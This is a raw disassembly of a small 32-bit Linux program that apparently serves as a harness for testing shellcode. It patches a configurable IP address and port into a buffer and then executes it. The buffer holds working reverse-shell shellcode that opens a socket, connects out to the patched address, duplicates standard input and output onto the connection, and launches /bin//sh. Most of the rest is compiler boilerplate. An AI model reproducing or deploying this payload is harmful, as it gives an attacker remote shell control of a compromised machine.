das
insb   (%dx),%es:(%edi)
imul   $0x6c2d646c,0x2f(%edx),%esp
imul   $0x6f732e78,0x75(%esi),%ebp
xor    %cs:(%eax),%al
add    $0x0,%al
add    %al,(%eax)
adc    %al,(%eax)
add    %al,(%eax)
add    %eax,(%eax)
add    %al,(%eax)
inc    %edi
dec    %esi
push   %ebp
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%edx)
add    %al,(%eax)
add    %al,(%esi)
add    %al,(%eax)
add    %bl,(%eax)
add    %al,(%eax)
add    $0x0,%al
add    %al,(%eax)
adc    $0x0,%al
add    %al,(%eax)
add    (%eax),%eax
add    %al,(%eax)
inc    %edi
dec    %esi
push   %ebp
add    %cl,(%eax)
stos   %al,%es:(%edi)
popa
sarb   %cl,0x5cb1bb41
cmpsl  %es:(%edi),%ds:(%esi)
push   %ds
cwtl
outsl  %cs:(%esi),(%dx)
mov    %eax,0xc81c5aa3
.byte 0x1a
add    (%eax),%al
add    %al,(%eax)
push   %es
add    %al,(%eax)
add    %al,(%ecx)
add    %al,(%eax)
add    %al,0x0
and    %al,(%eax)
and    %al,(%eax)
add    %al,(%eax)
add    %al,(%esi)
add    %al,(%eax)
.byte 0x0
lods   %ds:(%esi),%eax
dec    %ebx
jecxz  804818c <_init-0x16c>
sbb    (%eax),%al
add    %al,(%eax)
adc    (%eax),%al
add    %al,(%eax)
inc    %esp
add    %al,(%eax)
add    %ah,(%eax)
add    %al,(%eax)
add    %ah,(%ecx)
add    %al,(%eax)
add    %dl,(%edx)
add    %al,(%eax)
add    %dh,(%edx)
add    %al,(%eax)
add    %dl,(%edx)
add    %al,(%eax)
add    %ch,(%eax)
add    %al,(%eax)
add    %dl,(%edx)
add    %al,(%eax)
add    %cl,(%ebx)
add    %al,(%eax)
add    %bh,0x40804(%ebp,%eax,4)
add    %al,(%eax)
adc    %eax,(%eax)
.byte 0xf
add    %ch,0x62(%ecx,%ebp,2)
arpl   %bp,(%esi)
jae    80482b3 <_init-0x45>
cs add %bl,%cs:%ss:0x49(%edi)
dec    %edi
pop    %edi
jae    80482c1 <_init-0x37>
imul   $0x64657375,%fs:0x5f(%esi),%ebp
add    %dh,0x72(%eax)
imul   $0x74730066,0x74(%esi),%ebp
jb     80482cd <_init-0x2b>
outsb  %gs:(%esi),(%dx)
add    %ch,0x6e(%ecx)
gs
je     80482c8 <_init-0x30>
popa
fs
fs
jb     804826e <_init-0x8a>
pop    %edi
pop    %edi
insb   (%dx),%es:(%edi)
imul   $0x6174735f,0x63(%edx),%esp
jb     80482ee <_init-0xa>
pop    %edi
insl   (%dx),%es:(%edi)
popa
imul   $0x6d675f5f,0x0(%esi),%ebp
outsl  %ds:(%esi),(%dx)
outsb  %ds:(%esi),(%dx)
pop    %edi
jae    80482fd <_init+0x5>
popa
jb     8048300 <_init+0x8>
pop    %edi
pop    %edi
add    %al,0x4c(%edi)
dec    %ecx
inc    %edx
inc    %ebx
pop    %edi
xor    (%esi),%ch
xor    %al,(%eax)
add    %al,(%eax)
add    (%eax),%al
add    %al,(%eax)
add    (%eax),%al
add    (%eax),%al
add    (%eax),%al
add    %eax,(%eax)
add    %eax,(%eax)
add    %eax,(%eax)
add    %eax,(%eax)
add    %al,(%eax)
adc    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
adc    %ch,0x69(%ecx)
or     $0x20000,%eax
push   %ebx
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
cld
lahf
add    $0x8,%al
push   %es
add    (%eax),%al
or     $0xa0,%al
add    $0x8,%al
pop    %es
add    %eax,(%eax)
add    %dl,(%eax)
mov    0x2070804,%al
add    %al,(%eax)
adc    $0xa0,%al
add    $0x8,%al
pop    %es
add    (%eax),%eax
add    %bl,(%eax)
mov    0x4070804,%al
add    %al,(%eax)
sbb    $0xa0,%al
add    $0x8,%al
pop    %es
.byte 0x5
push   %ebx
sub    $0x8,%esp
call   80483b0 <__x86.get_pc_thunk.bx>
add    $0x1cff,%ebx
mov    -0x4(%ebx),%eax
test   %eax,%eax
je     8048316 <_init+0x1e>
call   8048340 <__gmon_start__@plt>
add    $0x8,%esp
pop    %ebx
ret
pushl  0x804a004
jmp    *0x804a008
add    %al,(%eax)
jmp    *0x804a00c
push   $0x0
jmp    8048320 <_init+0x28>
jmp    *0x804a010
push   $0x8
jmp    8048320 <_init+0x28>
jmp    *0x804a014
push   $0x10
jmp    8048320 <_init+0x28>
jmp    *0x804a018
push   $0x18
jmp    8048320 <_init+0x28>
jmp    *0x804a01c
push   $0x20
jmp    8048320 <_init+0x28>
xor    %ebp,%ebp
pop    %esi
mov    %esp,%ecx
and    $0xfffffff0,%esp
push   %eax
push   %esp
push   %edx
push   $0x80485a0
push   $0x8048530
push   %ecx
push   %esi
push   $0x80484d7
call   8048360 <__libc_start_main@plt>
hlt
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
mov    (%esp),%ebx
ret
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
mov    $0x804a097,%eax
sub    $0x804a094,%eax
cmp    $0x6,%eax
ja     80483d0 <deregister_tm_clones+0x10>
ret
mov    $0x0,%eax
test   %eax,%eax
je     80483cf <deregister_tm_clones+0xf>
push   %ebp
mov    %esp,%ebp
sub    $0x18,%esp
movl   $0x804a094,(%esp)
call   *%eax
leave
ret
lea    0x0(%esi),%esi
mov    $0x804a094,%eax
sub    $0x804a094,%eax
sar    $0x2,%eax
mov    %eax,%edx
shr    $0x1f,%edx
add    %edx,%eax
sar    %eax
jne    8048409 <register_tm_clones+0x19>
ret
mov    $0x0,%edx
test   %edx,%edx
je     8048408 <register_tm_clones+0x18>
push   %ebp
mov    %esp,%ebp
sub    $0x18,%esp
mov    %eax,0x4(%esp)
movl   $0x804a094,(%esp)
call   *%edx
leave
ret
mov    %esi,%esi
lea    0x0(%edi,%eiz,1),%edi
cmpb   $0x0,0x804a093
jne    804844c <__do_global_dtors_aux+0x1c>
push   %ebp
mov    %esp,%ebp
sub    $0x8,%esp
call   80483c0 <deregister_tm_clones>
movb   $0x1,0x804a093
leave
repz ret
xchg   %ax,%ax
mov    0x8049f10,%eax
test   %eax,%eax
je     8048478 <frame_dummy+0x28>
mov    $0x0,%eax
test   %eax,%eax
je     8048478 <frame_dummy+0x28>
push   %ebp
mov    %esp,%ebp
sub    $0x18,%esp
movl   $0x8049f10,(%esp)
call   *%eax
leave
jmp    80483f0 <register_tm_clones>
nop
jmp    80483f0 <register_tm_clones>
push   %ebp
mov    %esp,%ebp
sub    $0x10,%esp
mov    0x8(%ebp),%eax
lea    0x18(%eax),%edx
mov    0xc(%ebp),%eax
mov    %ax,(%edx)
mov    0x8(%ebp),%eax
movzbl 0x18(%eax),%eax
mov    %al,-0x1(%ebp)
mov    0x8(%ebp),%eax
lea    0x18(%eax),%edx
mov    0x8(%ebp),%eax
movzbl 0x19(%eax),%eax
mov    %al,(%edx)
mov    0x8(%ebp),%eax
lea    0x19(%eax),%edx
movzbl -0x1(%ebp),%eax
mov    %al,(%edx)
leave
ret
push   %ebp
mov    %esp,%ebp
sub    $0x28,%esp
mov    0xc(%ebp),%eax
mov    %eax,(%esp)
call   8048370 <inet_addr@plt>
mov    %eax,-0xc(%ebp)
mov    0x8(%ebp),%eax
lea    0x12(%eax),%edx
mov    -0xc(%ebp),%eax
mov    %eax,(%edx)
leave
ret
push   %ebp
mov    %esp,%ebp
and    $0xfffffff0,%esp
sub    $0x10,%esp
movl   $0x804a040,(%esp)
call   8048350 <strlen@plt>
mov    %eax,0x4(%esp)
movl   $0x80485c0,(%esp)
call   8048330 <printf@plt>
movl   $0x8235,0x4(%esp)
movl   $0x804a040,(%esp)
call   804847d <SET_PORT>
movl   $0x80485d0,0x4(%esp)
movl   $0x804a040,(%esp)
call   80484b6 <SET_IP>
call   804a040 <sc>
leave
ret
xchg   %ax,%ax
xchg   %ax,%ax
nop
push   %ebp
push   %edi
xor    %edi,%edi
push   %esi
push   %ebx
call   80483b0 <__x86.get_pc_thunk.bx>
add    $0x1ac5,%ebx
sub    $0x1c,%esp
mov    0x30(%esp),%ebp
lea    -0xf4(%ebx),%esi
call   80482f8 <_init>
lea    -0xf8(%ebx),%eax
sub    %eax,%esi
sar    $0x2,%esi
test   %esi,%esi
je     8048589 <__libc_csu_init+0x59>
lea    0x0(%esi),%esi
mov    0x38(%esp),%eax
mov    %ebp,(%esp)
mov    %eax,0x8(%esp)
mov    0x34(%esp),%eax
mov    %eax,0x4(%esp)
call   *-0xf8(%ebx,%edi,4)
add    $0x1,%edi
cmp    %esi,%edi
jne    8048568 <__libc_csu_init+0x38>
add    $0x1c,%esp
pop    %ebx
pop    %esi
pop    %edi
pop    %ebp
ret
jmp    80485a0 <__libc_csu_fini>
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
repz ret
push   %ebx
sub    $0x8,%esp
call   80483b0 <__x86.get_pc_thunk.bx>
add    $0x1a53,%ebx
add    $0x8,%esp
pop    %ebx
ret
add    (%eax),%eax
add    %eax,(%eax)
add    (%eax),%al
jae    804862b <_IO_stdin_used+0x6f>
jp     8048629 <_IO_stdin_used+0x6d>
cmp    (%eax),%ah
and    $0x79622064,%eax
je     8048632 <_IO_stdin_used+0x76>
jae    80485d9 <_IO_stdin_used+0x1d>
add    %dh,(%ecx)
xor    (%edi),%dh
xor    %ch,%cs:(%esi)
xor    %ch,(%esi)
xor    %eax,(%eax)
add    %ebx,(%ebx)
add    (%ebx),%edi
cmp    %al,(%eax)
add    %al,(%eax)
push   %es
add    %al,(%eax)
add    %al,-0x1(%ebp,%edi,8)
call   *0x0(%eax,%eax,1)
add    %ah,0x78fffffe(%ecx)
add    %al,(%eax)
add    %bl,%dl
(bad)
(bad)
lcall  *-0x5000000(%eax)
(bad)
(bad)
(bad)
mov    $0x54000000,%eax
(bad)
(bad)
(bad)
fadds  (%eax)
add    %al,(%eax)
(bad)
(bad)
(bad)
call   *(%ecx,%eax,1)
adc    $0x0,%al
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %edi,0x52(%edx)
add    %al,(%ecx)
jl     804862f <_IO_stdin_used+0x73>
add    %ebx,(%ebx)
or     $0x4,%al
add    $0x88,%al
add    %eax,(%eax)
add    %ah,(%eax)
add    %al,(%eax)
add    %bl,(%eax,%eax,1)
add    %al,(%eax)
call   69048639 <__TMC_END__+0x60ffe5a5>
add    %al,(%eax)
add    %al,(%eax)
push   %cs
or     %al,0xe(%esi)
or     $0x4a,%al
ud2
je     804864f <_IO_stdin_used+0x93>
js     804864d <_IO_stdin_used+0x91>
aas
sbb    (%ebx),%bh
sub    (%edx),%dh
and    $0x22,%al
sbb    $0x0,%al
add    %al,(%eax)
inc    %eax
add    %al,(%eax)
add    %ah,(%ecx)
(bad)
(bad)
(bad)
cmp    %eax,(%eax)
add    %al,(%eax)
add    %al,0xe(%ecx)
or     %al,0x50d4202(%ebp)
jne    8048634 <_IO_stdin_used+0x78>
or     $0x4,%al
add    $0x0,%al
add    %bl,(%eax,%eax,1)
add    %al,(%eax)
pusha
add    %al,(%eax)
add    %bh,(%edx)
(bad)
(bad)
jmp    *(%ecx)
add    %al,(%eax)
add    %al,(%eax)
inc    %ecx
push   %cs
or     %al,0x50d4202(%ebp)
pop    %ebp
lds    (%esp,%eax,1),%ecx
add    $0x0,%al
add    %bl,(%eax,%eax,1)
add    %al,(%eax)
addb   $0x0,(%eax)
add    %bh,(%ebx)
(bad)
(bad)
call   *0x0(%eax,%eax,1)
add    %al,(%eax)
inc    %ecx
push   %cs
or     %al,0x50d4202(%ebp)
add    -0x3b(%eax),%dl
or     $0x4,%al
add    $0x0,%al
cmp    %al,(%eax)
add    %al,(%eax)
mov    0x74000000,%al
(bad)
(bad)
jmp    *0x0(%ecx)
add    %al,(%eax)
add    %al,0xe(%ecx)
or     %al,0xc0e4102(%ebp)
xchg   %eax,(%ebx)
inc    %ebx
push   %cs
adc    %al,0x140e4104(%esi)
addl   $0x48,0x2300e4e
push   %cs
adc    $0x41,%al
ret
push   %cs
adc    %al,-0x3a(%ecx)
push   %cs
or     $0x41,%al
(bad)
push   %cs
or     %al,-0x3b(%ecx)
push   %cs
add    $0x10,%al
add    %al,(%eax)
add    %bl,%ah
add    %al,(%eax)
add    %ch,0x2fffffe(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
push   %eax
test   %al,(%eax,%ecx,1)
.byte 0x30
test   %al,(%eax,%ecx,1)
add    %al,(%eax)
add    %eax,(%eax)
add    %al,(%eax)
add    %eax,(%eax)
add    %al,(%eax)
or     $0x0,%al
add    %al,(%eax)
clc
(bad)
add    $0x8,%al
or     $0xa4000000,%eax
test   %eax,(%eax,%ecx,1)
sbb    %eax,(%eax)
add    %al,(%eax)
or     %bl,0x1b0804(%edi)
add    %al,(%eax)
add    $0x0,%al
add    %al,(%eax)
sbb    (%eax),%al
add    %al,(%eax)
or     $0x9f,%al
add    $0x8,%al
sbb    $0x0,%al
add    %al,(%eax)
add    $0x0,%al
add    %al,(%eax)
cmc
(bad)
ljmp   *-0x54(%edi)
addl   $0x5,(%eax,%ecx,1)
cmp    $0x82,%al
add    $0x8,%al
push   %es
add    %al,(%eax)
add    %cl,%ah
addl   $0xa,(%eax,%ecx,1)
pop    %ebp
add    %al,(%eax)
add    %cl,(%ebx)
add    %al,(%eax)
add    %dl,(%eax)
add    %al,(%eax)
add    %dl,0x0
add    %al,(%eax)
add    %al,(%ebx)
add    %al,(%eax)
add    %al,(%eax)
mov    0x20804,%al
add    %al,(%eax)
sub    %al,(%eax)
add    %al,(%eax)
adc    $0x0,%al
add    %al,(%eax)
adc    %eax,(%eax)
add    %al,(%eax)
pop    %ss
add    %al,(%eax)
add    %dl,%al
(bad)
add    $0x8,%al
adc    %eax,(%eax)
add    %al,(%eax)
enter  $0x482,$0x8
adc    (%eax),%al
add    %al,(%eax)
or     %al,(%eax)
add    %al,(%eax)
adc    (%eax),%eax
add    %al,(%eax)
or     %al,(%eax)
add    %al,(%eax)
(bad)
(bad)
ljmp   *-0x58(%edi)
(bad)
add    $0x8,%al
(bad)
(bad)
ljmp   *0x1(%edi)
add    %al,(%eax)
add    %dh,%al
(bad)
ljmp   *-0x66(%edi)
(bad)
add    $0x8,%al
add    %al,(%eax)
adc    $0x9f,%al
add    $0x8,%al
addl   $0x46,%ss:(%eax,%ecx,1)
addl   $0x56,(%eax,%ecx,1)
addl   $0x66,(%eax,%ecx,1)
addl   $0x76,(%eax,%ecx,1)
.byte 0x83
add    $0x8,%al
add    %al,(%eax)
push   $0x66
pop    %eax
push   $0x1
pop    %ebx
xor    %ecx,%ecx
push   %ecx
push   $0x1
push   $0x2
mov    %esp,%ecx
int    $0x80
push   $0x7f7f7f7f
pushw  $0xc9fc
pushw  $0x2
mov    %esp,%ecx
push   $0x10
push   %ecx
push   %eax
mov    %esp,%ecx
mov    %eax,%esi
push   $0x3
pop    %ebx
push   $0x66
pop    %eax
int    $0x80
xchg   %esi,%ebx
push   $0x2
pop    %ecx
mov    $0x3f,%al
int    $0x80
dec    %ecx
jns    804a074 <sc+0x34>
mov    $0xb,%al
xor    %edx,%edx
push   %edx
push   $0x68732f2f
push   $0x6e69622f
mov    %esp,%ebx
push   %edx
push   %ebx
mov    %esp,%ecx
int    $0x80
inc    %edi
inc    %ebx
inc    %ebx
cmp    (%eax),%ah
sub    %dl,0x62(%ebp)
jne    78 <_init-0x8048280>
je     81 <_init-0x8048277>
and    %dh,(%esi,%ebp,1)
cmp    %ch,(%esi)
xor    $0x2d,%al
xor    0x62(%ebp),%dh
jne    86 <_init-0x8048272>
je     8f <_init-0x8048269>
xor    %edi,0x31(%esi)
xor    $0x2e,%al
xor    %dh,(%ecx,%ebp,1)
and    %dh,(%esi,%ebp,1)
cmp    %ch,(%esi)
xor    $0x0,%al
inc    %edi
inc    %ebx
inc    %ebx
cmp    (%eax),%ah
sub    %dl,0x62(%ebp)
jne    a1 <_init-0x8048257>
je     aa <_init-0x804824e>
and    %dh,(%esi,%ebp,1)
cmp    %ch,(%esi)
xor    0x62753931,%ch
jne    b0 <_init-0x8048248>
je     b9 <_init-0x804823f>
xor    %ebp,(%ecx)
and    %dh,(%esi,%ebp,1)
cmp    %ch,(%esi)
xor    (%eax),%al
